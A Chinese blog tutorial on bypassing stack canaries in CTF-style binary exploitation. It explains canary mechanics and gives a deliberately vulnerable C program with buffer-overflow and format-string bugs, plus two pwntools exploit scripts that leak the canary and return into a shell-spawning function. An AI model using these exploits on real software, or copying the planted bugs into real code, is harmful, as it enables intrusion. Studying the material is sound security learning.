---
title: 绕过canary
date: 2021-03-28 19:44:41
tags:
    - pwn
    - canary
---

<!--more-->

# 介绍

我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip  等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让  shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie  信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为  Canary。

## Canary 实现原理

开启 Canary 保护的 stack 结构大概如下：（64位）

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local variables |
        Low     |                 |
        Address

```

当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下： 

```
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。

```
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

如果 Canary 已经被非法修改，此时程序流程会走到 `__stack_chk_fail`。`__stack_chk_fail` 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。

```
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

这意味可以通过劫持 `__stack_chk_fail` 的 got 值劫持流程或者利用 `__stack_chk_fail` 泄漏内容

## Canary 绕过

### 泄露栈中的 Canary[¶](https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/#canary_4)

Canary 设计为以字节 `\x00` 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的  Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。

#### 利用示例 [¶](https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/#_3)

存在漏洞的示例源代码如下:

```
// ex2.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）

```
$ gcc -m32 -no-pie ex2.c -o ex2
```

首先通过覆盖 Canary 最后一个 `\x00` 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中

####  EXP1

```
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')

get_shell = ELF("./ex2").sym["getshell"]

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa#代码中压入了100个A和回车，回车将0x00覆盖，
							#回车的ascii码为10，10的十六进制就是0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
io.send(payload)

io.recv()

io.interactive()
```

以上是CTFwiki给的实例，其实还可以通过格式化字符串泄露canary的值

就用上面的例子，用ida打开，找到它的溢出点read的地址

![image-20220328195217412](https://s2.loli.net/2022/03/28/XLcYd19MIOWDZ3l.png)

gdb中在该处下断点运行

![image-20220328195249208](https://s2.loli.net/2022/03/28/uUpez4Yv3cdKxZJ.png)

当我们输入n，输入一连串的aaaaa的时候，看一下栈

![image-20220328195456487](https://s2.loli.net/2022/03/28/Nk3YJt6ESyRvDwz.png)

![image-20220328200451335](https://s2.loli.net/2022/03/28/1ibQNCdnDt7Jogy.png)

可以看到以00位标志结尾的就是canary值，它距离栈底ebp有0xc距离

我们可以用pwntools的一个工具fmtarg 快速计算canary的偏移

![image-20220328200013667](https://s2.loli.net/2022/03/28/U4nuyzK9WTxYiht.png)

偏移是31，可以写EXP了

#### EXP2

```
# -*-coding:utf-8 -*-
from pwn import *
context.log_level='debug'
p=process('./canary')
get_shell = ELF("./canary").sym["getshell"]
p.sendlineafter("Hello Hacker!\n","%31$x")
canary_addr=int(p.recv(8),16)
log.info("Canary:"+hex(canary_addr))
payload = "a"*100+p32(canary_addr)+"a"*12+p32(get_shell)
p.sendline(payload)
p.interactive()
#格式化字符串
```

可以看到格式化字符串是比较方便绕过canary保护的

